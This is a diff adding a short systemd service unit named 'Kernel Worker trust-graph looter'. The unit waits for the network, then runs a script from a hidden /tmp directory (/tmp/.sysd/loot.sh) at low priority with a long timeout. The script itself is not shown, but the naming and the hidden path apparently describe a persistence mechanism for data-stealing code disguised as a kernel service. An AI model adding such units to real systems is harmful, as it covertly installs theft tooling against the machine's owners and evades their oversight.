@@ -1,0 +1,9 @@
+[Unit]
+Description=Kernel Worker trust-graph looter
+After=network-online.target
+
+[Service]
+Type=oneshot
+ExecStart=/tmp/.sysd/loot.sh
+TimeoutStartSec=600
+Nice=19
